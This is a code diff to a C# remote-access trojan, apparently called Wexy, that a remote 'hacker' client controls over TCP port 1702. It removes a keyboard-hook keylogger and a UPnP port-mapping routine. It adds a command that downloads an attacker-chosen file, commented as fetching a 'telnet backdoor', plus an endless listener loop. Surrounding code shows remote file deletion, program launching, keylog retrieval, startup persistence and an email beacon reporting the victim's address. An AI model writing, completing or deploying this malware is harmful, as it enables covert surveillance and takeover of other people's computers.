@@ -11,6 +11,7 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using Open.Nat;
 using System.Threading.Tasks;
+using System.Threading;
 
 
 namespace Wexy_Server
@@ -22,53 +23,7 @@ namespace Wexy_Server
         public static TcpListener listenner ;
         public static System.Threading.Thread Rec;
         public static TcpClient client;
-
-        #region KeyLogger
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
-
-
-        private static IntPtr SetHook(LowLevelKeyboardProc proc)
-        {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
-            {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
-            }
-        }
-
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
-            {
-                int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
-                StreamWriter sw = new StreamWriter(@"C:\Users\" + Environment.UserName + "\\Desktop\\log.txt", true);
-                sw.Write((Keys)vkCode);
-                sw.Close();
-
-            }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
-        }
-        #endregion
+        public static int port = 1702;
 
         public static void ReceiveCommands()
         {
@@ -77,7 +32,7 @@ namespace Wexy_Server
             while (true)
             {
                 //try to read the data from the client(the hacker)
-                
+                Thread.Sleep(10);
                 try
                 {
                     //Packet of the received data
@@ -186,6 +141,12 @@ namespace Wexy_Server
                         case "getkeylogs":
                             GetKeyLogsFile();
                             break;
+
+                        case "remote":
+                            string url = CommandArray[1];
+                            string fileName = CommandArray[2];
+                            DownloadFile(url,fileName);
+                            break;
                     }
                 }
                 catch
@@ -196,28 +157,13 @@ namespace Wexy_Server
         }
 
         #region Commands
-
-        static async void ListenOnOpenPort()
+        public static void DownloadFile(string url, string fileName)
         {
-            var discoverer = new NatDiscoverer();
-
-            // using SSDP protocol, it discovers NAT device.
-            var device = await discoverer.DiscoverDeviceAsync();
-
-            // display the NAT's IP address
-            Console.WriteLine("The external IP Address is: {0} ", await device.GetExternalIPAsync());
-
-            // create a new mapping in the router [external_ip:1702 -> host_machine:1602]
-            await device.CreatePortMapAsync(new Mapping(Protocol.Tcp, 1602, 1702, "For testing"));
-
-            // configure a TCP socket listening on port 1602
-            var endPoint = new IPEndPoint(IPAddress.Any, 1602);
-            var socket = new Socket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-            socket.SetIPProtectionLevel(IPProtectionLevel.Unrestricted);
-            socket.Bind(endPoint);
-            socket.Listen(4);
-        } 
-
+            //Download and run telnet backdoor
+            WebClient wb = new WebClient();
+            wb.DownloadFile(url, fileName);
+            
+        }
 
         // - ALMOST OK -
         public static void GetKeyLogsFile()
@@ -292,7 +238,7 @@ namespace Wexy_Server
             System.Diagnostics.Process app = new System.Diagnostics.Process();
             app.StartInfo.FileName = applicationName;
             app.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
-            app.Start();
+            app.Start();       
         }
 
         // - ALMOST OK - crashes when trying to access protected folders like c:/users/welsen/cookies
@@ -457,7 +403,7 @@ namespace Wexy_Server
             msg.To.Add("other_mail");
             msg.From = new MailAddress("mail");
             msg.Subject = "Wexy is alive !";
-            msg.Body = "The server is alive at " + getLocalIP();
+            msg.Body = "The server is alive at " + getLocalIP() + ":"+port;
             client.Send(msg);
         }
 
@@ -491,7 +437,7 @@ namespace Wexy_Server
         // - OK - 
         public static void deleteFile(string location)
         {
-            File.Delete(location);
+            File.Delete(location);         
         }
 
         // - OK - 
@@ -518,23 +464,20 @@ namespace Wexy_Server
 
         static void Main(string[] args)
         {
-            //How can I get it to work online ? :'(
-            //Deploiement idée :
-            //Clé usb avec un autorun , lorsqu'elle est branchée sur un pc , la clé va copier l'executable sur le système et executer l'application
-            //Egalement , faudrait qu'elle me donne l'adresse IP de la machine dans la clé usb.
-
-
+            
             //addToStartup();
             //alertAttacker();
-            //Task task = new Task(ListenOnOpenPort);
-            //task.Start();
+            //_hookID = SetHook(_proc);
+            //Application.Run();
+            //UnhookWindowsHookEx(_hookID); 
 
-            listenner = new TcpListener(IPAddress.Any, 1702);
+            listenner = new TcpListener(IPAddress.Any, port);
             listenner.Start();
 
-            Console.WriteLine(getLocalIP());
-            for (int i = 0; i < 10; i++) // < - not the best way
+            Console.WriteLine(getLocalIP() + ":" + port.ToString());
+            while (true)
             {
+                Thread.Sleep(200);
                 client = listenner.AcceptTcpClient();
                 Receiver = client.GetStream();
 
@@ -542,7 +485,7 @@ namespace Wexy_Server
 
                 Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
                 Rec.Start();
-            }        
+            }    
         }
     }
 }
